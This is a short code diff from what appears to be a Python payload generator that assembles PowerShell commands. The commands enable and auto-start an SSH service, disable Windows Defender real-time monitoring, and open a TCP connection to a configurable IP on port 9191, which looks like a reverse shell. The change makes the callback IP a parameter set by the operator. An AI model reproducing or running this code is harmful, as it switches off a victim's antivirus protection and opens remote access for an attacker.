@@ -59,7 +59,7 @@ class Details:
             "Start-Service sshd",
             "Set-Service -Name sshd -StartupType 'Automatic'",####SSH END
             "Set-MpPreference -DisableRealtimeMonitoring $true",  ##Disabling the Windows Defender
-            "$ip = '127.0.0.1'",  ###########CHANGE THE IP
+            f"$ip = {self.ip}",  ###########CHANGE THE IP
             "$port = 9191",         #############CHANGE THE PORT
             "$tcpClient = New-Object System.Net.Sockets.TcpClient",
             "$tcpClient.Connect($ip, $port)",
